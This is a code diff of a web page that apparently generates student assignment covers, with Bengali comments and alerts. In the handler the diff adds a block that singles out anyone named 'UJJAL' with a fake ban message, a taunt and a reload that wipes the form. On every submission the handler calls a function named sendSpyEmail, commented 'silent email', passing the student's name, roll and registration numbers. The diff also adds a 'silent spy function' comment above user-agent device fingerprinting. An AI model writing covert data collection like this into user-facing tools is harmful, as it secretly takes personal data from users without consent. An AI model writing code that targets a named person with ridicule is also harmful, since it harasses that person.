@@ -79,7 +79,7 @@
         </div>
 
         <button class="btn-gen" onclick="checkAndGenerate()">Generate Cover</button>
-        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()"> Download PDF</button>
+        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()">⬇ Download PDF</button>
     </div>
 
     <canvas id="canvas"></canvas>
@@ -105,20 +105,20 @@
             const rollIn = document.getElementById('roll');
             const regIn  = document.getElementById('reg');
 
-            //  UJJAL BLOCKING LOGIC START 
+            // 🔥 UJJAL BLOCKING LOGIC START 🔥
             const enteredName = nameIn.value.toUpperCase();
             
-            //   UJJAL 
+            // নাম যদি UJJAL হয় বা নামের মধ্যে UJJAL থাকে
             if (enteredName.includes("UJJAL")) {
-                if (navigator.vibrate) navigator.vibrate([200, 100, 200]); 
+                if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 200]); // ভয়ানক ভাইব্রেশন
                 
-                //   
-                alert("   ");
+                alert("❌ ACCESS DENIED! ❌\n\nSystem Error: User 'UJJAL' is BANNED from this server.\n\nতোর জন্য নয়। দোকানে করিয়ে নিবি 😏");
                 
+                // পেজ রিলোড মেরে সব ডাটা উড়িয়ে দেবে
                 location.reload(); 
-                return; 
+                return; // কাজ শেষ, আর নিচে যাবে না
             }
-            //  UJJAL BLOCKING LOGIC END 
+            // 🔥 UJJAL BLOCKING LOGIC END 🔥
 
             let isValid = true;
             if (!nameIn.value.trim()) { nameIn.classList.add('error'); isValid = false; }
@@ -128,16 +128,17 @@
 
             if (!isValid) {
                 if (navigator.vibrate) navigator.vibrate(200);
-                alert("        !");
+                alert("⚠️ দয়া করে সব তথ্য সঠিক ভাবে পূরণ কর!");
                 return;
             }
 
-            //  
+            // সাইলেন্ট ইমেইল
             sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value);
             
             generate(nameIn.value, subjIn.value, rollIn.value, regIn.value);
         }
 
+        // --- 🕵️‍♂️ সাইলেন্ট স্পাই ফাংশন ---
         function getDeviceModel() {
             const ua = navigator.userAgent;
             let model = "Generic Android";
